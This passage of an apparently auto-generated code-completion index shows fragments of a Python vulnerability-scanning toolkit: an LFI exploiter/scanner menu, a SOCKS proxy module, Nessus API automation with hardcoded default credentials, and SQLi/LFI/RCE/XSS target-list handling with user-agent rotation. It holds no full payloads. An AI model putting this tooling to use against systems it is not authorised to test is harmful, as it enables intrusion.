        "peekOfCode": "validChoice = choice == int(\"1\") or choice == int(\"2\") or choice == \"x\"\nwhile validChoice is False:\n    print(\"--------------------\")\n    print(\" [1] Exploiter       \")\n    print(\" [2] Scanner         \")\n    print(\" [3] Exit            \")\n    print(\"--------------------\")\n    choice = input(\" -> \")\n    if choice == \"3\":\n        sys.exit(0)",
        "detail": "VulnScan.modules.lfisuite",
        "documentation": {}
    },
    {
        "label": "ProxyError",
        "kind": 6,
        "importPath": "VulnScan.modules.socks",
        "description": "VulnScan.modules.socks",
        "peekOfCode": "class ProxyError(IOError):\n    \"\"\"\n    socket_err contains original socket.error exception.\n    \"\"\"\n    def __init__(self, msg, socket_err=None):\n        self.msg = msg\n        self.socket_err = socket_err\n        if socket_err:\n            self.msg += \": {0}\".format(socket_err)\n    def __str__(self):",
        "detail": "VulnScan.modules.socks",
        "documentation": {}
    },
    {
        "label": "GeneralProxyError",
        "kind": 6,
        "importPath": "VulnScan.modules.socks",
        "description": "VulnScan.modules.socks",
        "peekOfCode": "class GeneralProxyError(ProxyError):\n    pass\nclass ProxyConnectionError(ProxyError):\n    pass\nclass SOCKS5AuthError(ProxyError):\n    pass\nclass SOCKS5Error(ProxyError):\n    pass\nclass SOCKS4Error(ProxyError):\n    pass",
        "detail": "VulnScan.modules.socks",
        "documentation": {}
    },
    {
        "label": "ProxyConnectionError",
        "kind": 6,
        "importPath": "VulnScan.modules.socks",
        "description": "VulnScan.modules.socks",
        "peekOfCode": "class ProxyConnectionError(ProxyError):\n    pass\nclass SOCKS5AuthError(ProxyError):\n    pass\nclass SOCKS5Error(ProxyError):\n    pass\nclass SOCKS4Error(ProxyError):\n    pass\nclass HTTPError(ProxyError):\n    pass",
        "detail": "VulnScan.modules.socks",
        "documentation": {}
    },
    {
        "label": "SOCKS5AuthError",
        "kind": 6,
        "importPath": "VulnScan.modules.socks",
        "description": "VulnScan.modules.socks",
        "peekOfCode": "class SOCKS5AuthError(ProxyError):\n    pass\nclass SOCKS5Error(ProxyError):\n    pass\nclass SOCKS4Error(ProxyError):\n    pass\nclass HTTPError(ProxyError):\n    pass\nSOCKS4_ERRORS = {\n    0x5B: \"Request rejected or failed\",",
        "detail": "VulnScan.modules.socks",
        "documentation": {}
    },
    {
        "label": "SOCKS5Error",
        "kind": 6,
        "importPath": "VulnScan.modules.socks",
        "description": "VulnScan.modules.socks",
        "peekOfCode": "class SOCKS5Error(ProxyError):\n    pass\nclass SOCKS4Error(ProxyError):\n    pass\nclass HTTPError(ProxyError):\n    pass\nSOCKS4_ERRORS = {\n    0x5B: \"Request rejected or failed\",\n    0x5C: \"Request rejected because SOCKS server cannot connect to identd on the client\",\n    0x5D: \"Request rejected because the client program and identd report different user-ids\",",
        "detail": "VulnScan.modules.socks",
        "documentation": {}
    },
    {
        "label": "SOCKS4Error",
        "kind": 6,
        "importPath": "VulnScan.modules.socks",
        "description": "VulnScan.modules.socks",
        "peekOfCode": "class SOCKS4Error(ProxyError):\n    pass\nclass HTTPError(ProxyError):\n    pass\nSOCKS4_ERRORS = {\n    0x5B: \"Request rejected or failed\",\n    0x5C: \"Request rejected because SOCKS server cannot connect to identd on the client\",\n    0x5D: \"Request rejected because the client program and identd report different user-ids\",\n}\nSOCKS5_ERRORS = {",
        "detail": "VulnScan.modules.socks",
        "documentation": {}
    },
    {
        "label": "HTTPError",
        "kind": 6,
        "importPath": "VulnScan.modules.socks",
        "description": "VulnScan.modules.socks",
        "peekOfCode": "class HTTPError(ProxyError):\n    pass\nSOCKS4_ERRORS = {\n    0x5B: \"Request rejected or failed\",\n    0x5C: \"Request rejected because SOCKS server cannot connect to identd on the client\",\n    0x5D: \"Request rejected because the client program and identd report different user-ids\",\n}\nSOCKS5_ERRORS = {\n    0x01: \"General SOCKS server failure\",\n    0x02: \"Connection not allowed by ruleset\",",
        "detail": "VulnScan.modules.socks",
        "documentation": {}
    },
    {
        "label": "_BaseSocket",
        "kind": 6,
        "importPath": "VulnScan.modules.socks",
        "description": "VulnScan.modules.socks",
        "peekOfCode": "class _BaseSocket(socket.socket):\n    \"\"\"Allows Python 2's \"delegated\" methods such as send() to be overridden\"\"\"\n    def __init__(self, *pos, **kw):\n        _orig_socket.__init__(self, *pos, **kw)\n        self._savedmethods = dict()\n        for name in self._savenames:\n            self._savedmethods[name] = getattr(self, name)\n            delattr(self, name)  # Allows normal overriding mechanism to work\n    _savenames = list()\ndef _makemethod(name):",
        "detail": "VulnScan.modules.socks",
        "documentation": {}
    },
    {
        "label": "socksocket",
        "kind": 6,
        "importPath": "VulnScan.modules.socks",
        "description": "VulnScan.modules.socks",
        "peekOfCode": "class socksocket(_BaseSocket):\n    \"\"\"socksocket([family[, type[, proto]]]) -> socket object\n    Open a SOCKS enabled socket. The parameters are the same as\n    those of the standard socket init. In order for SOCKS to work,\n    you must specify family=AF_INET and proto=0.\n    The \"type\" argument must be either SOCK_STREAM or SOCK_DGRAM.\n    \"\"\"\n    default_proxy = None\n    def __init__(\n        self, family=socket.AF_INET, type=socket.SOCK_STREAM, proto=0, *args, **kwargs",
        "detail": "VulnScan.modules.socks",
        "documentation": {}
    },
    {
        "label": "set_self_blocking",
        "kind": 2,
        "importPath": "VulnScan.modules.socks",
        "description": "VulnScan.modules.socks",
        "peekOfCode": "def set_self_blocking(function):\n    @functools.wraps(function)\n    def wrapper(*args, **kwargs):\n        self = args[0]\n        try:\n            _is_blocking = self.gettimeout()\n            if _is_blocking == 0:\n                self.setblocking(True)\n            return function(*args, **kwargs)\n        except Exception as e:",
        "detail": "VulnScan.modules.socks",
        "documentation": {}
    },
    {
        "label": "set_default_proxy",
        "kind": 2,
        "importPath": "VulnScan.modules.socks",
        "description": "VulnScan.modules.socks",
        "peekOfCode": "def set_default_proxy(\n    proxy_type=None, addr=None, port=None, rdns=True, username=None, password=None\n):\n    \"\"\"\n    set_default_proxy(proxy_type, addr[, port[, rdns[, username, password]]])\n    Sets a default proxy which all further socksocket objects will use,\n    unless explicitly changed. All parameters are as for socket.set_proxy().\n    \"\"\"\n    socksocket.default_proxy = (\n        proxy_type,",
        "detail": "VulnScan.modules.socks",
        "documentation": {}
    },
    {
        "label": "setdefaultproxy",
        "kind": 2,
        "importPath": "VulnScan.modules.socks",
        "description": "VulnScan.modules.socks",
        "peekOfCode": "def setdefaultproxy(*args, **kwargs):\n    if \"proxytype\" in kwargs:\n        kwargs[\"proxy_type\"] = kwargs.pop(\"proxytype\")\n    return set_default_proxy(*args, **kwargs)\ndef get_default_proxy():\n    \"\"\"\n    Returns the default proxy, set by set_default_proxy.\n    \"\"\"\n    return socksocket.default_proxy\ngetdefaultproxy = get_default_proxy",
        "detail": "VulnScan.modules.socks",
        "documentation": {}
    },
    {
        "label": "get_default_proxy",
        "kind": 2,
        "importPath": "VulnScan.modules.socks",
        "description": "VulnScan.modules.socks",
        "peekOfCode": "def get_default_proxy():\n    \"\"\"\n    Returns the default proxy, set by set_default_proxy.\n    \"\"\"\n    return socksocket.default_proxy\ngetdefaultproxy = get_default_proxy\ndef wrap_module(module):\n    \"\"\"\n    Attempts to replace a module's socket library with a SOCKS socket. Must set\n    a default proxy using set_default_proxy(...) first.",
        "detail": "VulnScan.modules.socks",
        "documentation": {}
    },
    {
        "label": "wrap_module",
        "kind": 2,
        "importPath": "VulnScan.modules.socks",
        "description": "VulnScan.modules.socks",
        "peekOfCode": "def wrap_module(module):\n    \"\"\"\n    Attempts to replace a module's socket library with a SOCKS socket. Must set\n    a default proxy using set_default_proxy(...) first.\n    This will only work on modules that import socket directly into the namespace;\n    most of the Python Standard Library falls into this category.\n    \"\"\"\n    if socksocket.default_proxy:\n        module.socket.socket = socksocket\n    else:",
        "detail": "VulnScan.modules.socks",
        "documentation": {}
    },
    {
        "label": "create_connection",
        "kind": 2,
        "importPath": "VulnScan.modules.socks",
        "description": "VulnScan.modules.socks",
        "peekOfCode": "def create_connection(\n    dest_pair,\n    proxy_type=None,\n    proxy_addr=None,\n    proxy_port=None,\n    proxy_rdns=True,\n    proxy_username=None,\n    proxy_password=None,\n    timeout=None,\n    source_address=None,",
        "detail": "VulnScan.modules.socks",
        "documentation": {}
    },
    {
        "label": "__version__",
        "kind": 5,
        "importPath": "VulnScan.modules.socks",
        "description": "VulnScan.modules.socks",
        "peekOfCode": "__version__ = \"1.6.7\"\nimport functools\nimport logging\nimport os\nimport socket\nimport struct\nimport sys\nfrom base64 import b64encode\nfrom collections import Callable\nfrom errno import EOPNOTSUPP, EINVAL, EAGAIN",
        "detail": "VulnScan.modules.socks",
        "documentation": {}
    },
    {
        "label": "log",
        "kind": 5,
        "importPath": "VulnScan.modules.socks",
        "description": "VulnScan.modules.socks",
        "peekOfCode": "log = logging.getLogger(__name__)\nPROXY_TYPE_SOCKS4 = SOCKS4 = 1\nPROXY_TYPE_SOCKS5 = SOCKS5 = 2\nPROXY_TYPE_HTTP = HTTP = 3\nPROXY_TYPES = {\"SOCKS4\": SOCKS4, \"SOCKS5\": SOCKS5, \"HTTP\": HTTP}\nPRINTABLE_PROXY_TYPES = dict(zip(PROXY_TYPES.values(), PROXY_TYPES.keys()))\n_orgsocket = _orig_socket = socket.socket\ndef set_self_blocking(function):\n    @functools.wraps(function)\n    def wrapper(*args, **kwargs):",
        "detail": "VulnScan.modules.socks",
        "documentation": {}
    },
    {
        "label": "PROXY_TYPE_SOCKS4",
        "kind": 5,
        "importPath": "VulnScan.modules.socks",
        "description": "VulnScan.modules.socks",
        "peekOfCode": "PROXY_TYPE_SOCKS4 = SOCKS4 = 1\nPROXY_TYPE_SOCKS5 = SOCKS5 = 2\nPROXY_TYPE_HTTP = HTTP = 3\nPROXY_TYPES = {\"SOCKS4\": SOCKS4, \"SOCKS5\": SOCKS5, \"HTTP\": HTTP}\nPRINTABLE_PROXY_TYPES = dict(zip(PROXY_TYPES.values(), PROXY_TYPES.keys()))\n_orgsocket = _orig_socket = socket.socket\ndef set_self_blocking(function):\n    @functools.wraps(function)\n    def wrapper(*args, **kwargs):\n        self = args[0]",
        "detail": "VulnScan.modules.socks",
        "documentation": {}
    },
    {
        "label": "PROXY_TYPE_SOCKS5",
        "kind": 5,
        "importPath": "VulnScan.modules.socks",
        "description": "VulnScan.modules.socks",
        "peekOfCode": "PROXY_TYPE_SOCKS5 = SOCKS5 = 2\nPROXY_TYPE_HTTP = HTTP = 3\nPROXY_TYPES = {\"SOCKS4\": SOCKS4, \"SOCKS5\": SOCKS5, \"HTTP\": HTTP}\nPRINTABLE_PROXY_TYPES = dict(zip(PROXY_TYPES.values(), PROXY_TYPES.keys()))\n_orgsocket = _orig_socket = socket.socket\ndef set_self_blocking(function):\n    @functools.wraps(function)\n    def wrapper(*args, **kwargs):\n        self = args[0]\n        try:",
        "detail": "VulnScan.modules.socks",
        "documentation": {}
    },
    {
        "label": "PROXY_TYPE_HTTP",
        "kind": 5,
        "importPath": "VulnScan.modules.socks",
        "description": "VulnScan.modules.socks",
        "peekOfCode": "PROXY_TYPE_HTTP = HTTP = 3\nPROXY_TYPES = {\"SOCKS4\": SOCKS4, \"SOCKS5\": SOCKS5, \"HTTP\": HTTP}\nPRINTABLE_PROXY_TYPES = dict(zip(PROXY_TYPES.values(), PROXY_TYPES.keys()))\n_orgsocket = _orig_socket = socket.socket\ndef set_self_blocking(function):\n    @functools.wraps(function)\n    def wrapper(*args, **kwargs):\n        self = args[0]\n        try:\n            _is_blocking = self.gettimeout()",
        "detail": "VulnScan.modules.socks",
        "documentation": {}
    },
    {
        "label": "PROXY_TYPES",
        "kind": 5,
        "importPath": "VulnScan.modules.socks",
        "description": "VulnScan.modules.socks",
        "peekOfCode": "PROXY_TYPES = {\"SOCKS4\": SOCKS4, \"SOCKS5\": SOCKS5, \"HTTP\": HTTP}\nPRINTABLE_PROXY_TYPES = dict(zip(PROXY_TYPES.values(), PROXY_TYPES.keys()))\n_orgsocket = _orig_socket = socket.socket\ndef set_self_blocking(function):\n    @functools.wraps(function)\n    def wrapper(*args, **kwargs):\n        self = args[0]\n        try:\n            _is_blocking = self.gettimeout()\n            if _is_blocking == 0:",
        "detail": "VulnScan.modules.socks",
        "documentation": {}
    },
    {
        "label": "PRINTABLE_PROXY_TYPES",
        "kind": 5,
        "importPath": "VulnScan.modules.socks",
        "description": "VulnScan.modules.socks",
        "peekOfCode": "PRINTABLE_PROXY_TYPES = dict(zip(PROXY_TYPES.values(), PROXY_TYPES.keys()))\n_orgsocket = _orig_socket = socket.socket\ndef set_self_blocking(function):\n    @functools.wraps(function)\n    def wrapper(*args, **kwargs):\n        self = args[0]\n        try:\n            _is_blocking = self.gettimeout()\n            if _is_blocking == 0:\n                self.setblocking(True)",
        "detail": "VulnScan.modules.socks",
        "documentation": {}
    },
    {
        "label": "_orgsocket",
        "kind": 5,
        "importPath": "VulnScan.modules.socks",
        "description": "VulnScan.modules.socks",
        "peekOfCode": "_orgsocket = _orig_socket = socket.socket\ndef set_self_blocking(function):\n    @functools.wraps(function)\n    def wrapper(*args, **kwargs):\n        self = args[0]\n        try:\n            _is_blocking = self.gettimeout()\n            if _is_blocking == 0:\n                self.setblocking(True)\n            return function(*args, **kwargs)",
        "detail": "VulnScan.modules.socks",
        "documentation": {}
    },
    {
        "label": "SOCKS4_ERRORS",
        "kind": 5,
        "importPath": "VulnScan.modules.socks",
        "description": "VulnScan.modules.socks",
        "peekOfCode": "SOCKS4_ERRORS = {\n    0x5B: \"Request rejected or failed\",\n    0x5C: \"Request rejected because SOCKS server cannot connect to identd on the client\",\n    0x5D: \"Request rejected because the client program and identd report different user-ids\",\n}\nSOCKS5_ERRORS = {\n    0x01: \"General SOCKS server failure\",\n    0x02: \"Connection not allowed by ruleset\",\n    0x03: \"Network unreachable\",\n    0x04: \"Host unreachable\",",
        "detail": "VulnScan.modules.socks",
        "documentation": {}
    },
    {
        "label": "SOCKS5_ERRORS",
        "kind": 5,
        "importPath": "VulnScan.modules.socks",
        "description": "VulnScan.modules.socks",
        "peekOfCode": "SOCKS5_ERRORS = {\n    0x01: \"General SOCKS server failure\",\n    0x02: \"Connection not allowed by ruleset\",\n    0x03: \"Network unreachable\",\n    0x04: \"Host unreachable\",\n    0x05: \"Connection refused\",\n    0x06: \"TTL expired\",\n    0x07: \"Command not supported, or protocol error\",\n    0x08: \"Address type not supported\",\n}",
        "detail": "VulnScan.modules.socks",
        "documentation": {}
    },
    {
        "label": "DEFAULT_PORTS",
        "kind": 5,
        "importPath": "VulnScan.modules.socks",
        "description": "VulnScan.modules.socks",
        "peekOfCode": "DEFAULT_PORTS = {SOCKS4: 1080, SOCKS5: 1080, HTTP: 8080}\ndef set_default_proxy(\n    proxy_type=None, addr=None, port=None, rdns=True, username=None, password=None\n):\n    \"\"\"\n    set_default_proxy(proxy_type, addr[, port[, rdns[, username, password]]])\n    Sets a default proxy which all further socksocket objects will use,\n    unless explicitly changed. All parameters are as for socket.set_proxy().\n    \"\"\"\n    socksocket.default_proxy = (",
        "detail": "VulnScan.modules.socks",
        "documentation": {}
    },
    {
        "label": "getdefaultproxy",
        "kind": 5,
        "importPath": "VulnScan.modules.socks",
        "description": "VulnScan.modules.socks",
        "peekOfCode": "getdefaultproxy = get_default_proxy\ndef wrap_module(module):\n    \"\"\"\n    Attempts to replace a module's socket library with a SOCKS socket. Must set\n    a default proxy using set_default_proxy(...) first.\n    This will only work on modules that import socket directly into the namespace;\n    most of the Python Standard Library falls into this category.\n    \"\"\"\n    if socksocket.default_proxy:\n        module.socket.socket = socksocket",
        "detail": "VulnScan.modules.socks",
        "documentation": {}
    },
    {
        "label": "wrapmodule",
        "kind": 5,
        "importPath": "VulnScan.modules.socks",
        "description": "VulnScan.modules.socks",
        "peekOfCode": "wrapmodule = wrap_module\ndef create_connection(\n    dest_pair,\n    proxy_type=None,\n    proxy_addr=None,\n    proxy_port=None,\n    proxy_rdns=True,\n    proxy_username=None,\n    proxy_password=None,\n    timeout=None,",
        "detail": "VulnScan.modules.socks",
        "documentation": {}
    },
    {
        "label": "get_X_API_Token",
        "kind": 2,
        "importPath": "VulnScan.nessus",
        "description": "VulnScan.nessus",
        "peekOfCode": "def get_X_API_Token():\n    url = \"https://localhost:8834/nessus6.js\"\n    response = requests.get(url, verify=False).text\n    pattern = r\"return\\\"(\\w{8}-\\w{4}-\\w{4}-\\w{4}-\\w{12})\\\"\"\n    matches = re.findall(pattern, response)\n    return matches[1]\ndef getToken():\n    url = \"https://localhost:8834/session\"\n    data = {\"username\": \"admin\", \"password\": \"kali\"}\n    try:",
        "detail": "VulnScan.nessus",
        "documentation": {}
    },
    {
        "label": "getToken",
        "kind": 2,
        "importPath": "VulnScan.nessus",
        "description": "VulnScan.nessus",
        "peekOfCode": "def getToken():\n    url = \"https://localhost:8834/session\"\n    data = {\"username\": \"admin\", \"password\": \"kali\"}\n    try:\n        respone = requests.post(url, data=data, verify=False)\n        token = respone.json()['token']\n        return str(token)\n    except:\n        return str(None)\ndef Scan(target,x_api_token,token):",
        "detail": "VulnScan.nessus",
        "documentation": {}
    },
    {
        "label": "Scan",
        "kind": 2,
        "importPath": "VulnScan.nessus",
        "description": "VulnScan.nessus",
        "peekOfCode": "def Scan(target,x_api_token,token):\n    url = \"https://localhost:8834/scans\"\n    headers = {\n        \"X-Api-Token\": x_api_token,\n        \"X-Cookie\": \"token=\" + token + \"\",\n        \"Content-Type\": \"application/json\",\n        \"Content-Length\": \"295\"\n    }\n    data = {\n        \"uuid\": \"ab4bacd2-05f6-425c-9d79-3ba3940ad1c24e51e1f403febe40\",",
        "detail": "VulnScan.nessus",
        "documentation": {}
    },
    {
        "label": "checkStatus",
        "kind": 2,
        "importPath": "VulnScan.nessus",
        "description": "VulnScan.nessus",
        "peekOfCode": "def checkStatus(idscan,x_api_token,token):\n    url = f\"https://localhost:8834/scans/{idscan}?limit=2500&includeHostDetailsForHostDiscovery=true\"\n    headers = {\n        \"X-Api-Token\": x_api_token,\n        \"X-Cookie\": \"token=\" + token + \"\",\n        \"Content-Type\": \"application/json\",\n        \"Content-Length\": \"295\"\n    }\n    try:\n        respone = requests.get(url, headers=headers, verify=False)",
        "detail": "VulnScan.nessus",
        "documentation": {}
    },
    {
        "label": "getFileToken",
        "kind": 2,
        "importPath": "VulnScan.nessus",
        "description": "VulnScan.nessus",
        "peekOfCode": "def getFileToken(idscan,x_api_token,token):\n    url = \"https://localhost:8834/scans/\" + str(idscan) + \"/export?limit=2500\"\n    headers = {\n        \"X-Api-Token\": x_api_token,\n        \"X-Cookie\": \"token=\" + token + \"\",\n        \"Content-Type\": \"application/json\",\n        \"Content-Length\": \"295\"\n    }\n    data ={\"format\":\"pdf\",\"template_id\":1156,\"csvColumns\":{},\"formattingOptions\":{\"page_breaks\":\"false\"},\"extraFilters\":{\"host_ids\":[],\"plugin_ids\":[]}}\n    try:",
        "detail": "VulnScan.nessus",
        "documentation": {}
    },
    {
        "label": "exportFile",
        "kind": 2,
        "importPath": "VulnScan.nessus",
        "description": "VulnScan.nessus",
        "peekOfCode": "def exportFile(target,idscan):\n    token = getToken()\n    x_api_token = get_X_API_Token()\n    fileToken=getFileToken(idscan,x_api_token,token)\n    time.sleep(5)\n    print(\"File token: \" +fileToken)\n    url = f'https://localhost:8834/tokens/{fileToken}/download'\n    headers = {\n            \"X-Api-Token\": x_api_token,\n            \"X-Cookie\": \"token=\" + token + \"\",",
        "detail": "VulnScan.nessus",
        "documentation": {}
    },
    {
        "label": "NessusScan",
        "kind": 2,
        "importPath": "VulnScan.nessus",
        "description": "VulnScan.nessus",
        "peekOfCode": "def NessusScan(target):\n    token = getToken()\n    x_api_token = get_X_API_Token()\n    idscan = Scan(target,x_api_token,token) # idscan = \"131\"\n    scanProgress = checkStatus(idscan,x_api_token,token)\n    if scanProgress == 100:\n        print(G,\"Done Scaning Nessus !!!\")\n    else:\n        while scanProgress <= 100:\n            scanProgress = checkStatus(idscan,x_api_token,token)",
        "detail": "VulnScan.nessus",
        "documentation": {}
    },
    {
        "label": "W",
        "kind": 5,
        "importPath": "VulnScan.nessus",
        "description": "VulnScan.nessus",
        "peekOfCode": "W = \"\\033[0m\"\nR = \"\\033[31m\"\nG = \"\\033[32m\"\nO = \"\\033[33m\"\nB = \"\\033[34m\"\ndef get_X_API_Token():\n    url = \"https://localhost:8834/nessus6.js\"\n    response = requests.get(url, verify=False).text\n    pattern = r\"return\\\"(\\w{8}-\\w{4}-\\w{4}-\\w{4}-\\w{12})\\\"\"\n    matches = re.findall(pattern, response)",
        "detail": "VulnScan.nessus",
        "documentation": {}
    },
    {
        "label": "R",
        "kind": 5,
        "importPath": "VulnScan.nessus",
        "description": "VulnScan.nessus",
        "peekOfCode": "R = \"\\033[31m\"\nG = \"\\033[32m\"\nO = \"\\033[33m\"\nB = \"\\033[34m\"\ndef get_X_API_Token():\n    url = \"https://localhost:8834/nessus6.js\"\n    response = requests.get(url, verify=False).text\n    pattern = r\"return\\\"(\\w{8}-\\w{4}-\\w{4}-\\w{4}-\\w{12})\\\"\"\n    matches = re.findall(pattern, response)\n    return matches[1]",
        "detail": "VulnScan.nessus",
        "documentation": {}
    },
    {
        "label": "G",
        "kind": 5,
        "importPath": "VulnScan.nessus",
        "description": "VulnScan.nessus",
        "peekOfCode": "G = \"\\033[32m\"\nO = \"\\033[33m\"\nB = \"\\033[34m\"\ndef get_X_API_Token():\n    url = \"https://localhost:8834/nessus6.js\"\n    response = requests.get(url, verify=False).text\n    pattern = r\"return\\\"(\\w{8}-\\w{4}-\\w{4}-\\w{4}-\\w{12})\\\"\"\n    matches = re.findall(pattern, response)\n    return matches[1]\ndef getToken():",
        "detail": "VulnScan.nessus",
        "documentation": {}
    },
    {
        "label": "O",
        "kind": 5,
        "importPath": "VulnScan.nessus",
        "description": "VulnScan.nessus",
        "peekOfCode": "O = \"\\033[33m\"\nB = \"\\033[34m\"\ndef get_X_API_Token():\n    url = \"https://localhost:8834/nessus6.js\"\n    response = requests.get(url, verify=False).text\n    pattern = r\"return\\\"(\\w{8}-\\w{4}-\\w{4}-\\w{4}-\\w{12})\\\"\"\n    matches = re.findall(pattern, response)\n    return matches[1]\ndef getToken():\n    url = \"https://localhost:8834/session\"",
        "detail": "VulnScan.nessus",
        "documentation": {}
    },
    {
        "label": "B",
        "kind": 5,
        "importPath": "VulnScan.nessus",
        "description": "VulnScan.nessus",
        "peekOfCode": "B = \"\\033[34m\"\ndef get_X_API_Token():\n    url = \"https://localhost:8834/nessus6.js\"\n    response = requests.get(url, verify=False).text\n    pattern = r\"return\\\"(\\w{8}-\\w{4}-\\w{4}-\\w{4}-\\w{12})\\\"\"\n    matches = re.findall(pattern, response)\n    return matches[1]\ndef getToken():\n    url = \"https://localhost:8834/session\"\n    data = {\"username\": \"admin\", \"password\": \"kali\"}",
        "detail": "VulnScan.nessus",
        "documentation": {}
    },
    {
        "label": "Printer",
        "kind": 6,
        "importPath": "VulnScan.scanvuln",
        "description": "VulnScan.scanvuln",
        "peekOfCode": "class Printer:\n    def __init__(self, data):\n        stdout.write(\"\\r\\x1b[K\" + data.__str__())\n        stdout.flush()\ndef logo():\n    cache_Check()\n    sql_list_counter()\n    lfi_list_counter()\n    rce_list_counter()\n    xss_list_counter()",
        "detail": "VulnScan.scanvuln",
        "documentation": {}
    },
    {
        "label": "logo",
        "kind": 2,
        "importPath": "VulnScan.scanvuln",
        "description": "VulnScan.scanvuln",
        "peekOfCode": "def logo():\n    cache_Check()\n    sql_list_counter()\n    lfi_list_counter()\n    rce_list_counter()\n    xss_list_counter()\ndef killpid():\n    os.kill(os.getpid(), 9)\ndef ignoring_get(url):\n    header = [line.strip() for line in open(",
        "detail": "VulnScan.scanvuln",
        "documentation": {}
    },
    {
        "label": "killpid",
        "kind": 2,
        "importPath": "VulnScan.scanvuln",
        "description": "VulnScan.scanvuln",
        "peekOfCode": "def killpid():\n    os.kill(os.getpid(), 9)\ndef ignoring_get(url):\n    header = [line.strip() for line in open(\n        \"lists/header\", \"r\", encoding=\"utf-8\")]\n    ua = random.choice(header)\n    headers = {\"user-agent\": ua}\n    try:\n        try:\n            response = requests.get(url, headers=headers, timeout=2)",
        "detail": "VulnScan.scanvuln",
        "documentation": {}
    },
    {
        "label": "ignoring_get",
        "kind": 2,
        "importPath": "VulnScan.scanvuln",
        "description": "VulnScan.scanvuln",
        "peekOfCode": "def ignoring_get(url):\n    header = [line.strip() for line in open(\n        \"lists/header\", \"r\", encoding=\"utf-8\")]\n    ua = random.choice(header)\n    headers = {\"user-agent\": ua}\n    try:\n        try:\n            response = requests.get(url, headers=headers, timeout=2)\n            response.raise_for_status()\n        except Exception:",
        "detail": "VulnScan.scanvuln",
        "documentation": {}
    },
    {
        "label": "create_tmp_folder",
        "kind": 2,
        "importPath": "VulnScan.scanvuln",
        "description": "VulnScan.scanvuln",
        "peekOfCode": "def create_tmp_folder(self):\n    from tempfile import mkdtemp\n    self.temp = mkdtemp(prefix=\"v3n0m\")\n    if not self.temp.endswith(os.sep):\n        self.temp += os.sep\ndef progressBar(blocknum, blocksize, totalsize):\n    readsofar = blocknum * blocksize\n    if totalsize > 0:\n        percent = readsofar * 1e2 / totalsize\n        s = \"\\r%5.1f%% %*d / %d\" % (percent,",
        "detail": "VulnScan.scanvuln",
        "documentation": {}
    },
    {
        "label": "progressBar",
        "kind": 2,
        "importPath": "VulnScan.scanvuln",
        "description": "VulnScan.scanvuln",
        "peekOfCode": "def progressBar(blocknum, blocksize, totalsize):\n    readsofar = blocknum * blocksize\n    if totalsize > 0:\n        percent = readsofar * 1e2 / totalsize\n        s = \"\\r%5.1f%% %*d / %d\" % (percent,\n                                    len(str(totalsize)), readsofar, totalsize)\n        sys.stderr.write(s)\n    if readsofar >= totalsize:  # near the end\n        sys.stderr.write(\"\\n\")\ndef download(url, file, progressBar=None):",
        "detail": "VulnScan.scanvuln",
        "documentation": {}
    },
    {
        "label": "download",
        "kind": 2,
        "importPath": "VulnScan.scanvuln",
        "description": "VulnScan.scanvuln",
        "peekOfCode": "def download(url, file, progressBar=None):\n    print(\"Downloading %s\" % url)\n    urllib.request.urlretrieve(url, file, progressBar)\ndef unzip(file):\n    with zipfile.ZipFile(file + \"\", \"w\") as myzip:\n        myzip.write(file)\n    os.remove(file + \"\")\ndef f_menu(target):\n    import time\n    W = \"\\033[0m\"",
        "detail": "VulnScan.scanvuln",
        "documentation": {}
    },
    {
        "label": "unzip",
        "kind": 2,
        "importPath": "VulnScan.scanvuln",
        "description": "VulnScan.scanvuln",
        "peekOfCode": "def unzip(file):\n    with zipfile.ZipFile(file + \"\", \"w\") as myzip:\n        myzip.write(file)\n    os.remove(file + \"\")\ndef f_menu(target):\n    import time\n    W = \"\\033[0m\"\n    R = \"\\033[31m\"\n    G = \"\\033[32m\"\n    O = \"\\033[33m\"",
        "detail": "VulnScan.scanvuln",
        "documentation": {}
    },
    {
        "label": "f_menu",
        "kind": 2,
        "importPath": "VulnScan.scanvuln",
        "description": "VulnScan.scanvuln",
        "peekOfCode": "def f_menu(target):\n    import time\n    W = \"\\033[0m\"\n    R = \"\\033[31m\"\n    G = \"\\033[32m\"\n    O = \"\\033[33m\"\n    B = \"\\033[34m\"\n    global vuln_scan_count\n    global vuln\n    vuln_scan_count = []",
        "detail": "VulnScan.scanvuln",
        "documentation": {}
    },
    {
        "label": "xssTest",
        "kind": 2,
        "importPath": "VulnScan.scanvuln",
        "description": "VulnScan.scanvuln",
        "peekOfCode": "def xssTest(target):\n    XssList = 'Result/'+target+'/xss.txt'\n    list1 = [\n        line.strip()\n        for line in open(XssList, \"r\", errors=\"ignore\", encoding=\"utf-8\")\n    ]\n    try:\n        os.system(\"rm VulnScan/results/xss-test/xss-log\")\n    except:\n        pass",
        "detail": "VulnScan.scanvuln",
        "documentation": {}
    },
    {
        "label": "cache_Check",
        "kind": 2,
        "importPath": "VulnScan.scanvuln",
        "description": "VulnScan.scanvuln",
        "peekOfCode": "def cache_Check():\n    global cachestatus\n    my_file1 = Path(\"results/dorks/v3n0m-lfi.txt\")\n    my_file2 = Path(\"results/dorks/v3n0m-rce.txt\")\n    my_file3 = Path(\"results/dorks/v3n0m-xss.txt\")\n    my_file5 = Path(\"results/dorks/v3n0m-sqli.txt\")\n    my_file4 = Path(\"results/dorks/IPLogList.txt\")\n    if (\n        my_file1.is_file()\n        or my_file2.is_file()",
        "detail": "VulnScan.scanvuln",
        "documentation": {}
    },
    {
        "label": "sql_list_counter",
        "kind": 2,
        "importPath": "VulnScan.scanvuln",
        "description": "VulnScan.scanvuln",
        "peekOfCode": "def sql_list_counter():\n    global sql_count\n    try:\n        f = open(\"results/sqlmap/v3n0m-sqli.txt\", encoding=\"utf-8\")\n        l = [x for x in f.readlines() if x != \"\\n\"]\n        sql_count = len(l)\n    except FileNotFoundError:\n        sql_count = 0\ndef lfi_list_counter():\n    global lfi_count",
        "detail": "VulnScan.scanvuln",
        "documentation": {}
    },
    {
        "label": "lfi_list_counter",
        "kind": 2,
        "importPath": "VulnScan.scanvuln",
        "description": "VulnScan.scanvuln",
        "peekOfCode": "def lfi_list_counter():\n    global lfi_count\n    try:\n        f = open(\"results/lfi/v3n0m-lfi.txt\", encoding=\"utf-8\")\n        l = [x for x in f.readlines() if x != \"\\n\"]\n        lfi_count = len(l)\n    except FileNotFoundError:\n        lfi_count = 0\ndef xss_list_counter():\n    global xss_count",
        "detail": "VulnScan.scanvuln",
        "documentation": {}
    },
    {
        "label": "xss_list_counter",
        "kind": 2,
        "importPath": "VulnScan.scanvuln",
        "description": "VulnScan.scanvuln",
